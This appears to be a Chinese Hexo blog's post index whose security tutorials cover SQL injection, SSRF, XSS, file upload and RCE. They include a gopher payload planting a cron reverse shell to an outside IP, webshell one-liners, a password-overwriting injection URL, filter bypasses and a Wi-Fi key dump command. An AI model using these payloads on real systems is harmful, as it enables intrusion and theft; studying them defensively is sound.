我们说了，Parent.prototype上添加的属性和方法叫做原型属性和原型方法，该构造函数的实例都可以访问调用。那这个构造函数的原型上的属性和方法，怎么能和构造函数的实例联系在一起呢，就是通过__proto__属性。每个对象都有__proto__属性，该属性指向的就是该对象的原型。 1p1.__proto__ === Parent.prototype; // true p1.prototype 是错误的(可以理解为，在new出一个实例对象后，需要让new出的对象可以指向原型，因此设置了_proto_属性) __proto__通常称为隐式原型，prototype通常称为显式原型，那我们可以说一个对象的隐式原型指向了该对象的构造函数的显式原型。那么我们在显式原型上定义的属性方法，通过隐式原型传递给了构造函数的实例。这样一来实例就能很容易的访问到构造函数原型上的方法和属性了。我们之前也说过__proto__属性是对象（包括函数）独有的，那么Parent.prototype也是对象，那它有隐式原型么？又指向谁？ 1Parent.prototype.__proto__ === Object.prototype; //true 可以看到，构造函数的原型对象上的隐式原型对象指向了Object的原型对象。那么Parent的原型对象就继承了Object的原型对象。由此我们可以验证一个结论，万物继承自Object.prototype。这也就是为什么我们可以实例化一个对象，并且可以调用该对象上没有的属性和方法了。如： 12//我们并没有在Parent中定义任何方法属性，但是我们可以调用p1.toString();//hasOwnProperty 等等的一些方法 我们可以调用很多我们没有定义的方法，这些方法是哪来的呢？现在引出原型链的概念，当我们调用p1.toString()的时候，先在p1对象本身寻找，没有找到则通过p1.__proto__找到了原型对象Parent.prototype，也没有找到，又通过Parent.prototype.__proto__找到了上一层原型对象Object.prototype。在这一层找到了toString方法。返回该方法供p1使用。 当然如果找到Object.prototype上也没找到，就在Object.prototype.__proto__中寻找，但是Object.prototype.__proto__ === null所以就返回undefined。这就是为什么当访问对象中一个不存在的属性时，返回undefined了。 constructor属性12345function Person(age)&#123; this.age = age;&#125;var per1 = new Person(12);var per2 = new Person(13); 上面的例子中per1、per2都是Person的实例，这两个实例都有一个constructor属性，该属性（是一个指针）指向Person。（要把Person（）看成是构造函数） 1console.log(per1.constructor &#x3D;&#x3D; per2.constructor &#x3D;&#x3D; Person); &#x2F;&#x2F;true 函数的prototype对象都包含一个constructor的属性，constructor指向当前构造函数","categories":[],"tags":[{"name":"javaScript","slug":"javaScript","permalink":"http://yejuns.github.io/tags/javaScript/"}]},{"title":"web安全之SQL注入一","slug":"web安全之SQL注入-1","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-05T06:02:16.858Z","comments":true,"path":"2020/12/31/web安全之SQL注入-1/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-1/","excerpt":"","text":"SQL注入的原理是发生于应用程序与数据库层的安全漏洞 网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。 简单示例12345select id,name from test where id=1 # 用户输入，用 1 or 1=1 代替 1select id,name from test where id=1 or 1=1# 最后产生的效果类似 select id,name from test# 实现了一个越权操作 常用的数据库操作12345select version(); # 显示数据库版本select database(); # 查看当前正在使用的数据库select user(); # 查看使用当前数据库的用户select @@datadir; # 查看数据库路径select @@version_compile_os # 查看数据库安装的操作系统 渗透过程中使用的数据库和表information_schema ，是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等 SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表 TABLES表：提供了关于数据库中的表的信息（包括视图） COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。 常用构造注入方法使用union语句，select 1,2 union select 1,2 SQL注入类型按网络协议分 get注入 post注入 按注入的方式分 Boolean-based blind SQL injection（布尔型注入） 例如： http://test.com/view?id=1 and substring(version(),1,1)=5 UNION query SQL injection（联合查询注入）, 例如：使用union语句，select 1,2 union select 1,2 Time-based blind SQL injection（基于时间延迟注入）， 例如：使用sleep(3)函数，select * from user where id= ‘4’ and sleep(3) Error-based SQL injection（报错型注入） Stacked queries SQL injection（可多语句查询注入）","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"web安全之SSRF","slug":"web安全之SSRF","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-05T05:46:46.177Z","comments":true,"path":"2020/12/31/web安全之SSRF/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSSRF/","excerpt":"","text":"SSRFSSRF（Server-Side Request Forgery)服务端请求伪造,攻击者构造请求,由服务端发起的安全漏洞。一般情况下，SSRF的攻击目标是外网无法访问的内部系统(因为请求是服务端发起的,所以能请求到与服务器相连但与外部隔绝的内部网络)，可以利用该漏洞发起网络请求对内网服务进行探针和攻击 SSRF的原因服务端提供了从其他服务器应用获取数据的功能,且没有对目标地址进行过滤或限制。例如黑客通过服务端从指定URL地址读取网页文本内容，加载指定地址的图片等，利用的就是存在SSRF漏洞的Web应用作为代理攻击内网其它主机或本地服务器。 SSRF 利用1234567891011121314&lt;?phpfunction curl($url)&#123; //curl 模拟浏览器请求的，比如获取获取远程的网页 $ch = curl_init();//初始化一个curl会话 curl_setopt($ch, CURLOPT_URL, $url);//设置抓取的url curl_setopt($ch, CURLOPT_HEADER, 0);//设置header curl_exec($ch);//运行curl，请求网页 curl_close($ch);//关闭curl会话&#125;$url = $_GET[&#x27;url&#x27;];//从浏览器中传入地址curl($url); //传入curl函数中?&gt; 比如将上面的php文件部署到服务器上，就会造成SSRF 比如访问 http://test.com/ssrf.php?url=http://127.0.0.1:3306, 当参数接收到的是内网地址时,会直接将内网中的信息泄露出来，从而判断当前服务端是否存在mysql服务 访问http://ms08066.com/ssrf.php?url=file:///C:/key.php时,即可读取本地文件。 使用gopher协议反弹shell 1curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27; gopher协议格式, 具体使用 URL:gopher://:/_后接TCP数据流 相关危险函数SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 file_get_contents() , fsockopen() , curl_exec() SSRF 防御方案 限制请求端口只能是 Web端口,且只允许访问HTTP和HTTPS的请求。 限制不能访问内网的IP，防止对内网进行探针或攻击。 屏蔽返回的详细信息。 过滤绕过更改IP地址写法一些程序通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式： ^10(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$ ^172.([1][6-9]|[2]\\d|3[01])(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$ 我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成： 8进制格式：0300.0250.0.1 16进制格式：0xC0.0xA8.0.1 访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作 使用解析到内网的域名果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名 利用跳转如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过 常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"web漏洞","slug":"web安全之XSS攻击","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-01T14:00:14.802Z","comments":true,"path":"2020/12/31/web安全之XSS攻击/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%94%BB%E5%87%BB/","excerpt":"","text":"xss攻击xss攻击可以分成3类， 反射型XSS 存储型XSS DOM型XSS 反射型XSS非持久化的，用户必须点击带有特定参数的链接才可以生效，影响范围小，只影响执行脚本的用户比如对于一个未检测xss的文本框，输入 1&lt;script&gt;alert(&quot;点击开始修复&quot;)；location.href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt; 存储型xss存储型xss是指应用程序通过web请求获取到不可信赖的数据，在未校验是否有xss的情况下就存入数据库。当下一次从数据库中获取该程序时也未对其进行过滤，页面再次执行xss。存储型xss可以持续攻击用户。存储型xss出现的位置包括，留言板、评论区、用户头像、签名、博客 DOM型XSSDOM型XSS其实是一种特殊的反射型XSS，通过JS操作DOM树动态地输出数据到页面，而不依赖将数据提交给服务器端。，最常使用的函数是document.url，document.location，document.referere. 123&lt;script&gt;document.write(&quot;&lt;script&gt;alter(0)&lt;/script&gt;&quot;)&lt;/script&gt; 反射型XSS会经过后端语言，是页面引用后端输出生效。而DOM型XSS是经过JS对DOM树直接操作后插入到页面。所以不经过WAF的检测. 突变型XSS（mXSS）攻击者的输入看似安全，但是在浏览器解析标记时发生突变。（与浏览器有关）","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"web安全之文件上传漏洞","slug":"web安全之文件上传漏洞","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-05T00:46:01.692Z","comments":true,"path":"2020/12/31/web安全之文件上传漏洞/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"文件上传漏洞是什么？关键字：绕过 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。 简单案例在bwapp中选择文件上传漏洞的bug模式， 然后借助eval函数，制做一句话木马： 12&lt;?php @eval($_POST[&#x27;hacker&#x27;]); ?&gt;# 这里将post中上传的hacker字段取出，然后执行这个字段包含的数据 文件上传成功后，我们可以得到这个文件的地址：http://192.168.50.136/images/shell.php 因为我们的漏洞是要通过POST请求中的参数去触发，因此接下来我们通过发起POST请求，就可以拿到我们想要的内容，比如： 121、curl -d &quot;hacker=echo get_current_user();&quot; http://192.168.50.136/images/shell.php2、curl -d &quot;hacker = echo getcwd();&quot; http://192.168.50.136/images/shell.php PHP中，get_current_user可以获取当前的用户，getcwd()获取当前的目录 当然，我们拿到了一个shell，就可以使用集成型的工具去做进一步的利用，比如使用中国菜刀、冰蝎。 常用的一些一句话木马12345678910&lt;%execute(request(&quot;value&quot;))%&gt; #asp&lt;?php @eval($_POST[“value”]);?&gt;&lt;%@ Page Language=&quot;Jscript&quot;%&gt; #aspx&lt;%eval(Request.Item[&quot;value&quot;])%&gt; &lt;%eval request(&quot;value&quot;)%&gt;&lt;%execute request(&quot;value&quot;)%&gt;&lt;%execute(request(&quot;value&quot;))%&gt; 文件上传漏洞的绕过上面的例子只是简单的举例，在实际生活中不可能存在这样的漏洞给我们直接去利用，比如会有对.php、js文件的检测，这时候我们就要用各种方法去绕过检测机制 我们首先将bwapp的漏洞难度改成medium,然后会发现不能再用同样地方式上传文件。 我们只需要将shell.php改名为shell.php3，然后就可以正常上传，和上面一样，我们用相同的一句话木马，也就是说，php3文件是可以被php解释器解析，原因在于，php的解释器配置文件中，有这样一行代码： 1FilesMatch &quot;.+\\.ph(p[345]?|t|tml)$&quot;&gt; 也就是说，对于php3，php4,php5，phptml等文件，都是可以正常解析的。 大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如：Apache 在1.x和2.x版本中存在解析漏洞，因为Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析。 漏洞利用流程： 上传shell.php.test； 访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。 1、前端验证绕过原因：很多网站、CMS 都有使用，只在前端利用JavaScript 来做校验。 漏洞利用流程（两种方法都可以）: 通过Burp Suite抓包，然后修改内容后放行。 通过Chrome禁止/删除JavaScript代码. 2、.htaccess绕过.htaccess文件（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。 场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤。 3、大小写绕过如果我们想上传一个php木马，那么我们可以上传一个pHp即可 4、windows文件流特性绕过NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。 5、%00截断绕过即对于白名单的方式，如何绕过？ 可以对上传的文件名中加入十六进制的00，这样就可以将test.php.png截断成test.php。 文件头检测绕过我们可以拼接png与php文件，尝试执行。 需要注意的是，在拼接png文件时，我们需要将png文件中大部分的信息删除，只保留那些最基本的文件信息，防止出现php无法解析特殊字符的情况。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"windows常用命令","slug":"windows常用命令","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-01T14:00:36.996Z","comments":true,"path":"2020/12/31/windows常用命令/","link":"","permalink":"http://yejuns.github.io/2020/12/31/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"进程相关查看指定端口的使用情况（就可以获取端口上运行程序的PID）1netstat -ano | findstr 端口号 获取到PID后，就查看进程详细信息1tasklist | findstr 进程号 就可以知道启动该进程的程序，比如java.exe，然后使用任务管理器将其关闭 执行此命令强制关闭指定进程号的进程（类似linux中的kill）1taskkill -PID 进程号 -F 查看wifi密码1netsh wlan show profile * key=clear","categories":[],"tags":[{"name":"windows","slug":"windows","permalink":"http://yejuns.github.io/tags/windows/"}]},{"title":"web安全之XSS模版注入","slug":"web安全之XSS模板注入","date":"2020-12-21T08:01:51.000Z","updated":"2021-07-03T09:23:32.084Z","comments":true,"path":"2020/12/21/web安全之XSS模板注入/","link":"","permalink":"http://yejuns.github.io/2020/12/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"","text":"模版引擎模版引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，比如常用的Pug模版引擎 模版引擎便于数据与代码分离， 提供了转义功能。天生具有对XSS的防御效果。但是实际上产生了另一种问题。模版注入 模板注入服务端接受用户的输入，并将其作为Web 应用模板的一部分，即允许修改底层模板，在渲染过程中模板引擎执行用户插入的恶意内容。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"web安全之SQL注入-其他方式","slug":"web安全之SQL注入-其他方式","date":"2020-12-19T08:01:51.000Z","updated":"2021-07-03T09:23:25.553Z","comments":true,"path":"2020/12/19/web安全之SQL注入-其他方式/","link":"","permalink":"http://yejuns.github.io/2020/12/19/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F/","excerpt":"","text":"堆叠注入（Stacked Injections）一堆SQL 语句(多条)一起执行。 在MySQL 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。 堆叠注入和union injection（联合注入）有什么区别？union injection是有限的，受到前面一个查询的影响。而堆叠注入不影响 但是堆叠注入本身也有局限性： 并不是每一个环境下都可以执行，很可能受到API或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题。 真实环境中：通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的 相关APImysqli_multi_query 及mysqli_use_result 案例12http://127.0.0.1:81/vulnerabilities/sqli/?id=1&#x27;; update users set password=e10adc3949ba59abbe56e057f20f883e&#x27; where user_id=1; -- &amp;Submit=Submit## 使用堆叠注入，对admin账户的password进行更新。 OOB注入-带外通道技术（Out-Of-Band）带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用没有直接回显的漏洞。 这一类漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。 带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。 宽字节注入在数据库使用了宽字符集而web中没有考虑这个问题。character_set_client（客户端的字符集）和character_set_connection（连接层的字符集）不同，或转换函数如iconv、mb_convert_encoding使用不当 当存在宽字节注入的时候，注入参数里带入%DF,即可把\\（%5C）吃掉,，让&#39;重新出现 比如对以下url进行注入 http://ip/test/index.php?id=1 当提交，id=1&#39; and 1=1%23 mysql运行的SQL语句为 select * from user where id = &#39;1\\&#39; and 1=1#&#39; 很明显没有注入成功，而当我们提交,id=1%df&#39; and 1=1%23 mysql运行的SQL语句为 select * from user where id = &#39;1䞫&#39; and 1=1#&#39; 我们这里的宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\\也就是％5c中变成了一个汉字“运”，而“逃逸了出来。 解决办法统一数据库，web应用的字符集，避免解析产生差异。或者使用mysql_real_escape_string和mysql_set_charset，对数据进行正确的转义。","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"web安全之SqlMap","slug":"SqlMap源码解析","date":"2020-12-14T08:01:51.000Z","updated":"2021-07-03T09:22:42.926Z","comments":true,"path":"2020/12/14/SqlMap源码解析/","link":"","permalink":"http://yejuns.github.io/2020/12/14/SqlMap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/","excerpt":"","text":"SqlMap源码解析源码结构首先看一下目录结构，我们将文档类的文件排除掉，只看系统类： 目录 说明 data/ 数据库注入检测载荷、用户自定义攻击载荷、字典、shell命令、数据库触发顺序等 extra/ 一些额外功能，例如发出声响（beep）、运行cmd、安全执行、shellcode等 lib/ 包含了sqlmap的多种连接库，如五种注入类型请求的参数、提权操作等。 plugins/ 数据库信息和数据库通用事项 tamper/ 绕过脚本 thirdparty/ sqlmap使用的第三方的插件。 sqlmap.conf sqlmap的配置文件，如各种默认参数（默认是没有设置参数、可设置默认参数进行批量或者自动化检测） sqlmap.py sqlmap主程序文件 sqlmapapi.py sqlmap的api文件，可以将sqlmap集成到其他平台上","categories":[],"tags":[{"name":"SqlMap","slug":"SqlMap","permalink":"http://yejuns.github.io/tags/SqlMap/"}]},{"title":"web安全之SQL注入-报错注入","slug":"web安全之SQL注入-报错注入","date":"2020-12-12T08:01:51.000Z","updated":"2021-07-05T00:49:09.497Z","comments":true,"path":"2020/12/12/web安全之SQL注入-报错注入/","link":"","permalink":"http://yejuns.github.io/2020/12/12/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"","text":"报错注入（Error based Injection）一种SQL注入的类型，用于使SQL 语句报错的语法，用于注入结果无回显但错误信息有输出的情况。返回的错误信息即是攻击者需要的信息。 MySQL报错注入主要分为以下几类 BigInt 等数据类型溢出； Xpath 语法错误； count() + rand() + group_by() 导致重复； 空间数据类型函数错误。 会导致MySQL报错的函数 floor 函数； extractvalue 函数；（最多32字符） updatexml 函数； exp() 函数； 常用构造注入方法使用union语句，select 1,2 union select 1,2","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"web安全之php代码注入","slug":"web安全之RCE-php代码注入","date":"2020-11-11T13:01:51.000Z","updated":"2021-07-03T09:23:12.366Z","comments":true,"path":"2020/11/11/web安全之RCE-php代码注入/","link":"","permalink":"http://yejuns.github.io/2020/11/11/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE-php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/","excerpt":"","text":"PHP代码注入代码执行（注入）类似SQL注入漏洞，SQL注入是将SQL 语句注入到数据库中执行，而代码执行则是可以把代码注入到应用中最终由服务器运行它。这样的漏洞如果没有特殊的过滤，相当于直接有一个Web 后门的存在。 存在的原因 程序中含有可以执行PHP 代码的函数或者语言结构 传入第一点中的参数，客户端可控，直接修改或者影响 相关函数和语句 eval() 测试代码如下 1234567&lt;?phpif(isset($_REQUEST[&#x27;code&#x27;]))&#123; @$str=$_REQUEST[&#x27;code&#x27;]; eval($str);&#125;?&gt; 提交变量?code=phpinfo();或者?code=${phpinfo()};或者?code=1;phpinfo(); assert() assert() 同样会作为PHP 代码执行 其他的跟eval()类似 preg_replace() preg_replace() 函数作用是对字符串进行正则处理, preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int limit = -1[,int &amp;$count]]) 搜索$subject 中匹配$pattern 的部分，以$replacement 进行替换，而$pattern处，及第一个参数存在e 修饰时，$replacement 的值会被当成PHP 代码来执行 call_user_func() call_user_func() 等函数都有调用其他函数的功能，其中一个参数作为要调用的函数名，那如果这个传入的函数名可控，那就可以调用以外的函数来执行我们想要的代码，也就是存在任意代码执行漏洞 1234567 &lt;?php if(isset($_GET[&#x27;fun&#x27;]))&#123; $fun=$_GET[&#x27;fun&#x27;]; $para=$_GET[&#x27;para&#x27;]; call_user_func($fun,$para); &#125;?&gt; 提交参数?fun=assert&amp;amp;para=phpinfo() 动态函数$a($b) 由于PHP 的特性原因，PHP 的函数支持直接由拼接的方式调用，这导致PHP 再安全上的控制又加大了难度。不少知名程序也用到了动态函数的写法，这种写法跟使用call_user_func() 的初衷一样，用来更加方便的调用函数，但是一旦过滤不严格就会造成代码执行漏洞 1234567&lt;?phpif(isset($_GET[&#x27;a&#x27;]))&#123; $a=$_GET[&#x27;a&#x27;]; $b=$_GET[&#x27;b&#x27;]; $a($b);&#125;?&gt; 提交参数?a=assert$b=phpinfo() 漏洞利用 直接获取shell 提交参数[?code=@eval($_REQUEST[1])],即可构成一句话木马，密码为[1]。可以使用菜刀连接 获取当前文件的绝对路径 __FILE__ 是PHP 预定义常量，其含义为当前文件的路径。提交代码?code=print(__FILE__); 读文件 可以利用file_get_contents() 函数读取服务器任意文件，前提是知道文件的绝对路径(也可是相对路径)和读取权限。比如，?code=var_dump(file_get_contents(&#39;c:\\windows\\system32\\drivers\\etc\\hosts&#39;)); 写文件 可以利用file_put_contents() 函数写入文件，前提是知道可写文件目录,比如 ?code=var_dump(file_put_contents($_POST[1],$_POST[2])); 同时需要通过post方式提交参数1=shel.php&amp;2=&lt;?php phpinfo()?&gt; 防御方法 尽量不要使用eval(不是函数，是语言结构) 等函数 如果使用的话一定要进行严格的过滤 preg_replace 放弃使用/e 修饰符 修改配置文件 disable_functions=assert","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"AWVS安装、使用教程","slug":"AWVS使用","date":"2020-11-01T06:01:51.000Z","updated":"2021-07-07T13:18:31.592Z","comments":true,"path":"2020/11/01/AWVS使用/","link":"","permalink":"http://yejuns.github.io/2020/11/01/AWVS%E4%BD%BF%E7%94%A8/","excerpt":"","text":"AWVS是一款 Web 漏洞扫描工具，通过网络爬虫测试网站安全，检测流行的 Web 应用攻击，如跨站脚本、sql 注入等。 最近正好有空，就来试一试。 下载和安装下载和安装非常简单，链接在这里 AWVS使用windows中常用的一些命令1234567# 关闭服务Stop-Service -DisplayName &#x27;Acunetix&#x27;Stop-Service -DisplayName &#x27;Acunetix Database&#x27;# 启动服务Start-Service -DisplayName &#x27;Acunetix&#x27;Start-Service -DisplayName &#x27;Acunetix Database&#x27; 主要功能模块 Blind SQL injector:盲注工具 HTTP Editor：HTTP协议数据包编辑器 WebScanner：Web安全漏洞扫描（核心功能） Site Crawler：遍历站点目录结构（爬虫功能） HTTP Sniffer：HTTP协议嗅探器 HTTP Fuzzer：模糊测试工具 Authentication Tester: Web认证破解工具 Target Finder：端口扫描 Subdomain Scanner：子域名扫描器 开始扫描想要扫描某一个网站就很简单了，直接运行AWVS，然后在web页面上添加我们想要扫描的站点就可以。 添加成功后，点击scanner，即可开始扫描。扫描类型是 AWVS 为扫描特定类别的漏洞（例如跨站点脚本，SQL 注入等）执行的检查的逻辑分组, 主要类似有 完全扫描 - 使用 “完全扫描” 配置文件启动扫描，此扫描会进行所有可用的检查 高风险漏洞 - 仅检查最危险的 Web 漏洞 跨站点脚本漏洞 - 跨站点脚本扫描配置文件仅检查跨站点脚本漏洞 SQL 注入漏洞 - SQL 注入扫描配置文件仅检查 SQL 注入漏洞 弱密码 - 弱密码扫描配置文件将标识接受用户名和密码的表单，并将攻击这些表单 Crawl Only-Crawl Only 扫描仅对站点进行爬网并构建站点的结构，不运行任何漏洞检查 一段时间后，扫描结果会显示在首页上（扫描有风险，请在扫描之前做好上报工作）。 查看扫描结果扫描完成后，AWVS会给注册邮箱发送一封邮件，其中包含结果摘要以及一个链接，可直接访问扫描结果。扫描结果显示扫描的开始和结束日期，扫描的持续时间以及在扫描过程中已识别的所有警报。在网络扫描期间，当扫描检测到并使用 AWVS 时，活动面板将显示一条消息。 扫描结果包括 4 个部分 扫描统计信息 – 概述扫描检测到的目标，以及有关扫描的信息，例如扫描持续时间，平均响应时间和扫描的文件数。 漏洞 – 检测到的漏洞列表-按严重性排序 站点结构 – 可以使用站点结构来确保 AWVS 覆盖了所有站点，并确定了影响扫描站点的特定文件或文件夹的漏洞。单击文件夹图标以展开站点结构树 事件 – 与扫描相关的事件列表。这将显示扫描开始和结束的时间，以及在扫描过程中是否遇到任何错误","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"hexo命令和theme pure的使用","slug":"hexo设置","date":"2020-10-31T14:01:51.000Z","updated":"2021-07-09T12:09:44.742Z","comments":true,"path":"2020/10/31/hexo设置/","link":"","permalink":"http://yejuns.github.io/2020/10/31/hexo%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"建站 hexo init &lt; folder &gt; cd &lt; folder &gt; npm install 最后会生成这样的项目，其结构如下 123456789.├── _config.yml 网站的配置信息├── package.json 应用程序的信息├── scaffolds 模版文件夹├── source 资源文件夹是存放用户资源的地方| ├── _drafts| └── _posts└── themes 主题文件夹 常用的命令 hexo init [folder] #初始化 hexo new [layout] &lt;title&gt; hexo generate # hexo -g hexo server #Hexo 会监视文件变动并自动更新，除修改站点配置文件外,无须重启服务器,直接刷新网页即可生效 hexo publish [layout] &lt; filename &gt; hexo server –port –static –log hexo deploy hexo clean hexo list &lt;list&gt; Pure主题pure官方文档使用pure主题1、使用git下载theme，然后将相关代码复制到theme目录下的pure文件夹中 git clone https://github.com/cofess/hexo-theme-pure.git themes/pure 2、修改hexo目录下的 _config.yml 文件，修改其中的 theme：pure 3、安装相关npm插件（需要进入hexo目录下，输入相关代码） npm install hexo-wordcount –save npm install hexo-generator-json-content –save npm install hexo-generator-feed –save npm install hexo-generator-sitemap –save npm install hexo-generator-baidu-sitemap –save 4、相关博客 常见问题1、如何在hexo中控制图片的大小 使用img标签1&lt;img src=&quot;./xxx.png&quot; width = &quot;300&quot; height = &quot;200&quot; alt=&quot;图片名称&quot; align=center /&gt; 如果需要居中的话只要在外面包围div标签即可123&lt;div align=&quot;center&quot;&gt; ...&lt;/div&gt;","categories":[],"tags":[{"name":"hexo使用","slug":"hexo使用","permalink":"http://yejuns.github.io/tags/hexo%E4%BD%BF%E7%94%A8/"}]},{"title":"web安全之RCE","slug":"web安全之RCE ","date":"2020-10-21T08:01:51.000Z","updated":"2021-07-05T00:55:18.330Z","comments":true,"path":"2020/10/21/web安全之RCE /","link":"","permalink":"http://yejuns.github.io/2020/10/21/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE%20/","excerpt":"","text":"RCE原理RCE 令执行漏洞分为两种： 代码执行和命令执行 代码执行:执行的是脚本代码,脚本能执行的函数决定了危害程度（eval函数里必须是一个符合php语法的语句） 命令执行: 执行的是系统命令,能执行的系统命令决定了危害程度（system是命令执行） RCE 漏洞基本是产生在网站的查询接口或其他需要调用执行系统命令的函数的服务中 目标站点拥有一个查询服务的接口,如果调用了执行代码或命令的函数,就有可能存在RCE漏洞;反之，一个静态博客，没有任何接口和其他服务，基本上就不会存在RCE漏洞 RCE 漏洞利用 白盒测试： 代码审计 黑盒测试： 漏扫工具扫描，公开漏洞，手工根据参数值和功能点进行判定（比如 参数值有 ?id=echo 123) 系统命令执行漏洞利用以系统命令执行漏洞 为例,页面源码如下 123&lt;?phpecho system(&quot;ping -n 2 &quot; . $_GET[&#x27;ip&#x27;]);?&gt; 当访问 http://test.com/rce.php?ip=127.0.0.1时,程序会执行 ping 127.0.0.1,然后将结果返回到页面上 由于参数ip的值 127.0.0.1 是可控的;如果将值修改为 127.0.0.1 | whoami 再次访问，我们就可以得到当前用户名 